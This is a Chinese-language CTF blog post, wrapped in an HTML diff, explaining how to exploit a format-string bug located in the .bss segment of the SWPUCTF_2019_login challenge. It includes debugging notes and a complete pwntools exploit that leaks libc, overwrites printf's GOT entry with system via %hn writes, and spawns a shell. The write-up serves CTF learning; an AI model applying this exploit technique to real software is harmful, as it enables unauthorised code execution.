@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>bss段上的格式化字符串处理 | SOME PEDLARY OF MAHO&lt;br&gt;(please be brave and keep running)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <meta name="description" content="bss段上的格式化字符串处理–SWPUCTF_2019_login1，区别：bss段上的格式化字符串和栈上的格式化字符串最大的区别在于：输入的格式化字符串被放在“.bss段”上，导致无法直接利用格式化字符串写在栈上的数据进行任意地址写，采取的攻击措施是：利用ebp寄存器的地址映射，将ebp映射的—-">
+  
+  
+  
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+  
+  <link rel="stylesheet" href="../../../../css/style.css">
+  
+    <link rel="stylesheet" href="../../../../fancybox/jquery.fancybox-1.3.4.css">
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div id="nav-outer">
+  <nav id="main-nav" class="outer">
+    <a id="main-nav-toggle" class="nav-icon"></a>
+    
+      <a class="main-nav-link" href="../../../../index.html">Home</a>
+    
+      <a class="main-nav-link" href="../../../../archives">Archives</a>
+    
+    <div class="main-nav-space-between"></div>
+    
+  </nav>
+</div>
+<div id="header-title">
+  <h1 id="logo-wrap">
+    <a href="../../../../index.html" id="logo">SOME PEDLARY OF MAHO&lt;br&gt;(please be brave and keep running)</a>
+  </h1>
+  
+</div>
+
+      <div id="content" class="outer">
+        <section id="main"><article id="post-bss" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="" class="article-date">
+  <time class="dt-published" datetime="2023-04-15T11:26:13.000Z" itemprop="datePublished">2023-04-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="../../../../categories/CTF-PWN/">CTF-PWN</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      bss段上的格式化字符串处理
+    </h1>
+  
+
+      </header>
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="bss段上的格式化字符串处理–SWPUCTF-2019-login"><a href="#bss段上的格式化字符串处理–SWPUCTF-2019-login" class="headerlink" title="bss段上的格式化字符串处理–SWPUCTF_2019_login"></a>bss段上的格式化字符串处理–SWPUCTF_2019_login</h2><h3 id="1，区别："><a href="#1，区别：" class="headerlink" title="1，区别："></a>1<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>区别<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h3><p>bss段上的格式化字符串和栈上的格式化字符串最大的区别在于<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br><strong>输入的格式化字符串被放在<span class="bd-box"><h-char class="bd bd-end"><h-inner>“</h-inner></h-char></span>.bss段<span class="bd-box"><h-char class="bd bd-beg"><h-inner>”</h-inner></h-char></span>上<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>导致无法直接利用格式化字符串写在栈上的数据进行任意地址写<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span></strong><br>采取的攻击措施是<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br><strong><em>利用ebp寄存器的地址映射<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>将ebp映射的—-&gt;一个栈中地址A的指针指向—-&gt;和got表相似的地址B<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>从而完成先将B地址修改为<span class="bd-box"><h-char class="bd bd-beg"><h-inner>”</h-inner></h-char></span>printf<span class="bd-box"><h-char class="bd bd-end"><h-inner>“</h-inner></h-char></span>got表的地址—&gt;借助两次格式化字符串修改<span class="bd-box"><h-char class="bd bd-beg"><h-inner>”</h-inner></h-char></span>printf<span class="bd-box"><h-char class="bd bd-end"><h-inner>“</h-inner></h-char></span>got表的值<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>从而将<span class="bd-box"><h-char class="bd bd-end"><h-inner>“</h-inner></h-char></span>printf<span class="bd-box"><h-char class="bd bd-beg"><h-inner>”</h-inner></h-char></span>的got表的值修改为<span class="bd-box"><h-char class="bd bd-end"><h-inner>“</h-inner></h-char></span>system<span class="bd-box"><h-char class="bd bd-beg"><h-inner>”</h-inner></h-char></span>的got表的值<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>getshell<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>+v+ yes<span class="bd-box"><h-char class="bd bd-beg"><h-inner>！</h-inner></h-char></span></em></strong></p>
+<p><strong>总结<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>既然写的东西都在bss段中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>那么利用ebp的地址映射把与目标输入的类似的栈中已有的地址先写进去<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>之后不断修改<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>构造出合适的攻击链进行get shell</strong></p>
+<h3 id="2，IDA分析："><a href="#2，IDA分析：" class="headerlink" title="2，IDA分析："></a>2<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>IDA分析<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h3><p><img src="https://github.com/Mahoyeye/blogImage/blob/main/bssfmastrpic1.png?raw=true" alt="3c63bdb0a9034a90a4b37c806581af9d.png"><br>明显的格式化漏洞<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>但写在了bss段上<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span></p>
+<h3 id="3，gdb调试："><a href="#3，gdb调试：" class="headerlink" title="3，gdb调试："></a>3<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>gdb调试<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h3><p><img src="https://github.com/Mahoyeye/blogImage/blob/main/bssfmastrpic2.png?raw=true" alt="11ec9e63d94043509c6b2f05f039a4ce.png"></p>
+<ul>
+<li>ebp寄存器的的参数偏移是6</li>
+<li>ebp所指的映射地址为0xffc78f28<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>参数偏移是10</li>
+<li>两个以80开头<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>与got表地址相似的<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>栈中的地址参数偏移分别是9<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>11</li>
+</ul>
+<p>通过修改这个ebp<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>即可以修改两个与got表相近的栈中地址为<span class="bd-box"><h-char class="bd bd-end"><h-inner>“</h-inner></h-char></span>printf<span class="bd-box"><h-char class="bd bd-beg"><h-inner>”</h-inner></h-char></span>的got表地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>之后只要将这两个victim_got地址分高低位分别一起修改为<span class="bd-box"><h-char class="bd bd-beg"><h-inner>”</h-inner></h-char></span>system<span class="bd-box"><h-char class="bd bd-end"><h-inner>“</h-inner></h-char></span>的got表地址,并输入<span class="bd-box"><h-char class="bd bd-end"><h-inner>“</h-inner></h-char></span>sh<span class="bd-box"><h-char class="bd bd-beg"><h-inner>”</h-inner></h-char></span>即可get shell<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span><br>构造结果如下<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br><img src="https://github.com/Mahoyeye/blogImage/blob/main/bssfmastrpic3.png?raw=true" alt="768f3238465e47238e0103a4ddee64df.png"></p>
+<h3 id="4，exp："><a href="#4，exp：" class="headerlink" title="4，exp："></a>4<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>exp<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h3><pre><code class="python">from LibcSearcher import *
+from pwn import *
+
+io=process(&#39;./SWPUCTF_2019_login&#39;)
+elf=ELF(&#39;./SWPUCTF_2019_login&#39;)
+libc=elf.libc
+context.log_level=&#39;debug&#39;
+
+def fmtsend(addr,place):
+    io.recvuntil(&#39;Try again!\n&#39;)
+    payload = &#39;%&#39;+str(addr)+&#39;c&#39;+&#39;%&#39;+str(place)+&#39;$hn&#39;
+    print payload
+    io.sendline(payload)
+#解释&lt;span class=&quot;bd-box&quot;&gt;&lt;h-char class=&quot;bd bd-beg&quot;&gt;&lt;h-inner&gt;：&lt;/h-inner&gt;&lt;/h-char&gt;&lt;/span&gt;将偏移是place的地址所指向的地址的后两位修改为addr
+
+def debug():
+    gdb.attach(io,&quot;b *0x080485AF&quot;)
+    io.sendline(&#39;aa&#39;)
+
+io.sendlineafter(&#39;name:&#39;,&#39;aaa&#39;)
+payload1=&#39;%15$p&#39;
+io.sendlineafter(&#39;password:&#39;,payload1)
+io.recvuntil(&#39;This is the wrong password: &#39;)
+libc_start_main = int(io.recvuntil(&#39;\n&#39;)[:-1],16)-262
+# libc=LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main)
+# libc_base=liba_start_main-libc.dump(&#39;__libc_start_main&#39;)
+libc_base=libc_start_main-libc.sym[&#39;__libc_start_main&#39;]
+print &quot;libc_base-----&gt;&quot; + hex(libc_base)
+system=libc_base+libc.sym[&#39;system&#39;]
+binsh=libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
+payload2=&#39;%6$p&#39;
+io.sendlineafter(&#39;Try again!\n&#39;,payload2)
+io.recvuntil(&#39;This is the wrong password: &#39;)
+target=int(io.recvuntil(&#39;\n&#39;)[:-1],16)
+print &quot;target-----&gt;&quot; + hex(target)
+print hex(elf.got[&#39;puts&#39;])
+
+heap_base = target-0x28
+stack_addr = heap_base+0x2c
+stack_addr2=heap_base+0x24
+bias1=stack_addr&amp;0xffff
+bias2=elf.got[&#39;printf&#39;]&amp;0xffff
+bias3=stack_addr2&amp;0xffff
+system_back4=(system&amp;0xffff)
+system_for4=(system&amp;0xffff0000)&gt;&gt;16
+print hex(bias1)
+print hex(bias2)
+print hex(system)
+print hex(system_for4)
+print hex(system_back4)
+# pause()
+
+
+
+# gdb.attach(io,&quot;b *0x080485AF&quot;)
+fmtsend(bias1,6)
+fmtsend(bias2,10)
+fmtsend(bias1-8,6)
+fmtsend(bias2+2,10)
+payload = &#39;%&#39;+str(system_back4)+&#39;c&#39;+&#39;%&#39;+str(11)+&#39;$hn&#39;+&#39;%&#39;+str(system_for4-system_back4)+&#39;c&#39;+&#39;%&#39;+str(9)+&#39;$hn&#39;
+io.recvuntil(&#39;Try again!\n&#39;)
+io.sendline(payload)
+io.sendline(&#39;;sh&#39;)
+
+io.interactive()
+</code></pre>
+<h3 id="5，exp构造完之后的思考："><a href="#5，exp构造完之后的思考：" class="headerlink" title="5，exp构造完之后的思考："></a>5<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>exp构造完之后的思考<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h3><ol>
+<li>在做bss段中的格式化字符串题目时<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>我们改变ebp指向的地址进行的地址映射从而实现了修改栈中相似数据更替目标数据<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>约等于<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>向栈空间写入数据<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+<li>做类似题目的前提是<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>栈中存在可泄漏的got表地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+<li>写入两个victim_got地址目的是通过依次修改它们高低两字节而高修稿成功率的将<span class="bd-box"><h-char class="bd bd-end"><h-inner>“</h-inner></h-char></span>printf<span class="bd-box"><h-char class="bd bd-beg"><h-inner>”</h-inner></h-char></span>函数地址修改为<span class="bd-box"><h-char class="bd bd-end"><h-inner>“</h-inner></h-char></span>system<span class="bd-box"><h-char class="bd bd-beg"><h-inner>”</h-inner></h-char></span>函数地址<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="../../08/pwnable_orw%EF%BC%88%E9%87%8D%E7%82%B9%E4%B8%BA%E6%89%8B%E5%86%99shellcode%E4%B8%8E%E6%B2%99%E7%9B%92orw%E6%9C%BA%E5%88%B6%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Älter</strong>
+      <div class="article-nav-title">
+        
+          pwnable_orw（重点为手写shellcode与沙盒orw机制）
+        
+      </div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 cy<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a><br>
+      
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="../../../../index.html" class="mobile-nav-link">Home</a>
+  
+    <a href="../../../../archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="../../../../js/clipboard.min.js"></script>
+<script src="../../../../js/jquery-1.4.3.min.js"></script>
+
+<script src="../../../../fancybox/jquery.fancybox-1.3.4.pack.js"></script>
+
+
+<script src="../../../../js/script.js"></script>
+
+
+
+
+
+
+<script>
+  MathJax = {
+    options: {
+      enableMenu: false
+    },
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      displayMath: [['$$', '$$'], ['\\[', '\\]']],
+    }
+  };
+</script>
+<!-- <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+    CommonHTML: {
+      linebreaks: false
+    }
+  });
+  </script> -->
+<script type="text/javascript" id="MathJax-script" async
+  src="../../../../mathjax/tex-chtml.js">
+</script>
+<!-- <script type="text/javascript"
+   src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS_CHTML">
+</script> -->
+
+
+
+  </div>
+</body>
+</html>
